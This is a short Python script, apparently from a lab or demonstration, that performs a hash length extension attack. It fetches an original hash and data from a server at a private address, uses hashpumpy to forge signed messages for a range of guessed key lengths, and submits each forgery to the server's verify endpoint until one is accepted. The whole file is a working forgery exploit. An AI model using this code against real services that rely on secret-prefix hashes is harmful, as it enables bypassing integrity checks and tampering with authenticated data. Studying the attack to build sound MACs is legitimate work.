import hashlib
import requests
import hashpumpy
import base64
import typer
from time import sleep
from rich.console import Console
from rich.progress import track
from rich.panel import Panel
from rich.text import Text
console = Console()


def get_initial_data(server_url):
    try:
        response = requests.get(f"{server_url}/init")
        data = response.json()
        original_hash = data['original_hash']
        original_data = base64.b64decode(data['original_data']).decode('ascii')
        return original_hash, original_data
    except Exception as e:
        print(f"Error retrieving initial data: {e}")
        return None, None

def run_hashpump(original_hash, original_data, new_data, key_length):
    try:
        new_hash, new_message = hashpumpy.hashpump(original_hash, original_data, new_data, key_length)
        encoded_message = base64.b64encode(new_message).decode('ascii')
        return new_hash, encoded_message
    except Exception as e:
        print(f"Error running hashpump: {e}")
        return None, None

def send_attack_request(server_url, new_message, new_hash):
    try:
        response = requests.post(f"{server_url}/verify", data={'data': new_message, 'hash': new_hash})
        return response.json()
    except Exception as e:
        print(f"Error in the server request: {e}")
        return None

def main():
    # Parametri dell'attacco
    server_url = 'http://10.0.0.2:5000'
    console.log(Panel(Text(f"Data:", no_wrap=True)))
    with console.status("Obtaining original data..."):
        sleep(1)
        original_hash, original_data = get_initial_data(server_url)
    console.log(Panel(Text(f"""Original hash: {original_hash}
Original data: {original_data}""", no_wrap=True)))
    new_data = 'new_data'
    
    for key_length in track(range(1,30), description="Trying different key length...", console = console):
        # Esegui hashpump
        new_hash, new_message = run_hashpump(original_hash, original_data, new_data, key_length)
            
        if new_hash and new_message:
            # Invia la richiesta al server
            response = send_attack_request(server_url, new_message, new_hash)
            console.log(Panel(Text(f"""New hash: {new_hash}
New message: {base64.b64decode(new_message)}
Key length: {key_length}
Response of the server: {response}""", no_wrap=True)))
            if response.get('status') == 'success':
                break
                

if __name__ == "__main__":
    typer.run(main)